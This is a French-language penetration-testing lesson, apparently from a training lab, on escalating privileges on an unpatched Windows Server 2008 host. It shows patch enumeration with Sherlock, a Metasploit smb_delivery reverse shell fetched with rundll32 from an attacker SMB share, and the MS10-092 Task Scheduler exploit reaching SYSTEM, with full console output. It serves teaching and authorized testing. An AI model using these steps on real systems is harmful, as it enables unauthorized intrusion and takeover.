Serveur Windows
==============

* * * * *

Windows Server 2008/2008 R2 est arrivé en fin de vie le 14 janvier 2020. Au fil des ans, Microsoft a ajouté des fonctionnalités de sécurité améliorées aux versions ultérieures de Windows Server. Il n'est pas très courant de rencontrer Server 2008 lors d'un test d'intrusion externe, mais je le rencontre souvent lors d'évaluations internes.

* * * * *

Server 2008 par rapport aux versions plus récentes
------------------------------

Le tableau ci-dessous montre quelques différences notables entre Server 2008 et les dernières versions de Windows Server.

| Caractéristique | Serveur 2008 R2 | Serveur 2012 R2 | Serveur 2016 | Serveur 2019 |
| --- | --- | --- | --- | --- |
| [Protection avancée contre les menaces Windows Defender (ATP) améliorée](https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection) | | | | X |
| [Just Assez d'administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1) | Partielle | Partielle | X | X |
| [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard) | | | X | X |
| [Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard) | | | X | X |
| [Device Guard (intégrité du code)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419) | | | X | X |
| [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) | Partielle | X | X | X |
| [Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security) | Partielle | Partielle | X | X |
| [Control Flow Guard] (https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard) | | | X | X |

* * * * *

Étude de cas du serveur 2008
----------------------

Souvent, lors de mes évaluations, je tombe sur des versions de système d'exploitation héritées, à la fois Windows et Linux. Parfois, il s'agit simplement de systèmes oubliés sur lesquels le client peut rapidement agir et mettre hors service, tandis que d'autres fois, il peut s'agir de systèmes critiques qui ne peuvent pas être facilement supprimés ou remplacés. Les testeurs d'intrusion doivent comprendre le cœur de métier du client et tenir des discussions pendant l'évaluation, en particulier lorsqu'il s'agit de scanner/énumérer et d'attaquer des systèmes hérités, et pendant la phase de reporting. Tous les environnements ne sont pas identiques et nous devons tenir compte de nombreux facteurs lors de la rédaction de recommandations pour les conclusions et de l'attribution de cotes de risque. Par exemple, les environnements médicaux peuvent exécuter des logiciels critiques sur des systèmes Windows XP/7 ou Windows Server 2003/2008. Sans comprendre le raisonnement "pourquoi", il ne suffit pas de leur dire simplement de retirer les systèmes de l'environnement. S'ils utilisent un logiciel d'IRM coûteux que le fournisseur ne prend plus en charge, la transition vers de nouveaux systèmes pourrait coûter cher. Dans ce cas, nous devrions examiner d'autres contrôles d'atténuation mis en place par le client, tels que la segmentation du réseau, le support étendu personnalisé de Microsoft, etc.

Si nous évaluons un client avec les protections les plus récentes et les meilleures et trouvons un hôte Server 2008 qui a été manqué, cela peut être aussi simple que de recommander une mise à niveau ou une mise hors service. Cela pourrait également être le cas dans des environnements soumis à des exigences d'audit/réglementaires strictes où un système hérité pourrait leur valoir un « échec » ou une note faible à leur audit et même les retarder ou les forcer à perdre un financement gouvernemental.

Examinons un hôte Windows Server 2008 que nous pouvons découvrir dans un environnement médical, une grande université ou un bureau gouvernemental local, entre autres.

Pour un système d'exploitation plus ancien comme Windows Server 2008, nous pouvons utiliser un script d'énumération comme [Sherlock](https://github.com/rasta-mouse/Sherlock) pour rechercher les correctifs manquants. Nous pouvons également utiliser quelque chose comme [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), qui prend les résultats de la commande `systeminfo` comme entrée et compare le niveau de correctif de l'hôte par rapport à la base de données des vulnérabilités de Microsoft pour détecter d'éventuels correctifs manquants sur la cible. Si un exploit existe dans le framework Metasploit pour le patch manquant donné, l'outil le suggérera. D'autres scripts d'énumération peuvent nous y aider, ou nous pouvons même énumérer manuellement le niveau de correctif et effectuer nos propres recherches. Cela peut être nécessaire s'il existe des limitations dans le chargement des outils sur l'hôte cible ou dans l'enregistrement de la sortie de la commande.

#### Interroger le niveau de correctif actuel

Utilisons d'abord WMI pour vérifier les KB manquants.

Interroger le niveau de correctif actuel

```
C:\htb> wmic qfe

Légende CSName Description FixComments HotFixID InstallDate InstalledBy InstalledOn Nom ServicePackInEffect État
http://support.microsoft.com/?kbid=2533552 Mise à jour WINLPE-2K8 KB2533552 WINLPE-2K8\Administrateur 31/03/2021

```

Un Google rapidela recherche du dernier correctif installé nous montre que ce système est très obsolète.

#### Exécuter Sherlock

Lançons Sherlock pour recueillir plus d'informations.

Exécuter Sherlock

```
PS C:\htb> Set-ExecutionPolicy bypass -Scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y


PS C:\htb> Import-Module .\Sherlock.ps1
PS C:\htb> Find-AllVulns

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/thttps://us-cert.cisa.gov/ncas/alerts/aa20-133aree/master/MS16-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable

```

#### Obtention d'un shell Meterpreter

À partir de la sortie, nous pouvons voir plusieurs correctifs manquants. À partir de là, récupérons un shell Metasploit sur le système et essayons d'élever les privilèges à l'aide de l'un des CVE identifiés. Tout d'abord, nous devons obtenir un shell inversé `Meterpreter` . Nous pouvons procéder de plusieurs manières, mais une méthode simple consiste à utiliser le module `smb_delivery` .

Obtention d'un shell Meterpreter

```
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery

Matching Modules
================
   #  Name                              Disclosure Date  Rank       Check  Description
   -  ----                              ---------------  ----       -----  -----------
   0  exploit/windows/smb/smb_delivery  2016-07-26       excellent  No     SMB Delivery
Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/smb_delivery


msf6 exploit(windows/smb/smb_delivery) > use 0

[*] Using configured payload windows/meterpreter/reverse_tcp


msf6 exploit(windows/smb/smb_delivery) > show options 

Module options (exploit/windows/smb/smb_delivery):
   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_NAME    test.dll         no        DLL file name
   FOLDER_NAME                   no        Folder name to share (Default none)
   SHARE                         no        Share (Default Random)
   SRVHOST      10.10.14.3       yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      445              yes       The local port to listen on.
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   1   PSH


msf6 exploit(windows/smb/smb_delivery) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   DLL
   1   PSH


msf6 exploit(windows/smb/smb_delivery) > set target 0

target => 0


msf6 exploit(windows/smb/smb_delivery) > exploit 
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Started service listener on 10.10.14.3:445 
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0

```

#### Commande Rundll sur l'hôte cible

Ouvrez une console cmd sur l'hôte cible et collez la commande `rundll32.exe` .

Commande Rundll sur l'hôte cible

```
C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

#### Réception d'une coque inversée

Nous recevons un rappel rapidement.

Réception d'une coque inversée

```
msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400
```

#### Recherche d'un exploit d'escalade de privilèges local

À partir de là, recherchons le module [MS10_092 Windows Task Scheduler '.XML' Privilege Escalation](https://www.exploit-db.com/exploits/19930) .

Recherche d'un exploit d'escalade de privilèges local

```
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338

Matching Modules
================
   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation
   
   
msf6 exploit(windows/smb/smb_delivery) use 0

```

#### Migration vers un processus 64 bits

Avant d'utiliser le module en question, nous devons sauter dans notre shell Meterpreter et migrer vers un processus 64 bits, sinon l'exploit ne fonctionnera pas. Nous aurions également pu choisir une charge utile x64 Meterpeter lors de l'étape `smb_delivery` .

Migration vers un processus 64 bits

```
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1

[*] Starting interaction with 1...

meterpreter > getpid

Current pid: 2268


meterpreter > ps

Process List
============
 PID   PPID  Name               Arch  Session  User                    Path
 ---   ----  ----               ----  -------  ----                    ----
 0     0     [System Process]
 4     0     System
 164   1800  VMwareUser.exe     x86   2        WINLPE-2K8\htb-student  C:\Program Files (x86)\VMware\VMware Tools\VMwareUser.exe
 244   2032  winlogon.exe
 260   4     smss.exe
 288   476   svchost.exe
 332   324   csrss.exe
 376   324   wininit.exe
 476   376   services.exe
 492   376   lsass.exe
 500   376   lsm.exe
 584   476   mscorsvw.exe
 600   476   svchost.exe
 616   476   msdtc.exe
 676   476   svchost.exe
 744   476   taskhost.exe       x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\taskhost.exe
 756   1800  VMwareTray.exe     x86   2        WINLPE-2K8\htb-student  C:\Program Files (x86)\VMware\VMware Tools\VMwareTray.exe
 764   476   svchost.exe
 800   476   svchost.exe
 844   476   svchost.exe
 900   476   svchost.exe
 940   476   svchost.exe
 976   476   spoolsv.exe
 1012  476   sppsvc.exe
 1048  476   svchost.exe
 1112  476   VMwareService.exe
 1260  2460  powershell.exe     x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1408  2632  conhost.exe        x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 1464  900   dwm.exe            x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\dwm.exe
 1632  476   svchost.exe
 1672  600   WmiPrvSE.exe
 2140  2460  cmd.exe            x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\cmd.exe
 2256  600   WmiPrvSE.exe
 2264  476   mscorsvw.exe
 2268  2628  rundll32.exe       x86   2        WINLPE-2K8\htb-student  C:\Windows\SysWOW64\rundll32.exe
 2460  2656  explorer.exe       x64   2        WINLPE-2K8\htb-student  C:\Windows\explorer.exe
 2632  2032  csrss.exe
 2796  2632  conhost.exe        x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 2876  476   svchost.exe
 3048  476   svchost.exe
 
 
meterpreter > migrate 2796

[*] Migrating from 2268 to 2796...
[*] Migration completed successfully.


meterpreter > background

[*] Backgrounding session 1...

```

#### Configuration des options du module d'escalade des privilèges

Une fois cela défini, nous pouvons maintenant configurer le module d'escalade de privilèges en spécifiant notre session Meterpreter actuelle, en définissant notre IP tun0 pour le LHOST et un port de rappel de notre choix.

Définition des options du module d'élévation des privilèges

```
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1

SESSION => 1


msf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.3

lhost => 10.10.14.3


msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443

lport => 4443


msf6 exploit(windows/local/ms10_092_schelevator) > show options

Module options (exploit/windows/local/ms10_092_schelevator):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION   1                yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4443             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008

```

#### Réception d'une coque inversée surélevée

Si tout se passe comme prévu, une fois que nous aurons tapé `exploit`, nous recevrons un nouveau shell Meterpreter en tant que compte `NT AUTHORITY\SYSTEM` et nous pourrons continuer à effectuer toute post-exploitation nécessaire.

Réception de la coque inversée surélevée

```
msf6 exploit(windows/local/ms10_092_schelevator) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4443
[*] Preparing payload at C:\Windows\TEMP\uQEcovJYYHhC.exe
[*] Creating task: isqR4gw3RlxnplB
[*] SUCCESS: The scheduled task "isqR4gw3RlxnplB" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\isqR4gw3RlxnplB...
[*] Original CRC32: 0x89b06d1a
[*] Final CRC32: 0x89b06d1a
[*] Writing our modified content back...
[*] Validating task: isqR4gw3RlxnplB
[*]
[*] Folder: \
[*] TaskName                                 Next Run Time          Status
[*] ======================================== ====================== ===============
[*] isqR4gw3RlxnplB                          6/1/2021 1:04:00 PM    Ready
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "isqR4gw3RlxnplB" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "isqR4gw3RlxnplB" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (175174 bytes) to 10.129.43.15
[*] SUCCESS: Attempted to run the scheduled task "isqR4gw3RlxnplB".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.3:4443 -> 10.129.43.15:49634) at 2021-05-12 16:04:34 -0400
[*] SUCCESS: The scheduled task "isqR4gw3RlxnplB" was successfully deleted.
[*] SCHELEVATOR


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM


meterpreter > sysinfo

Computer        : WINLPE-2K8
OS              : Windows 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows

```

* * * * *

Serveur d'attaque 2008
---------------------

En prenant les exemples d'énumération que nous avons parcourus dans ce module, accédez au système ci-dessous, trouvez un moyen de passer au niveau d'accès `NT AUTHORITY\SYSTEM` (il peut y avoir plus d'un moyen) et soumettez le fichier `flag.txt`  sur le bureau de l'administrateur. Mettez-vous au défi d'élever les privilèges de plusieurs façons et ne reproduisez pas simplement l'escalade de privilèges du planificateur de tâches détaillée ci-dessus.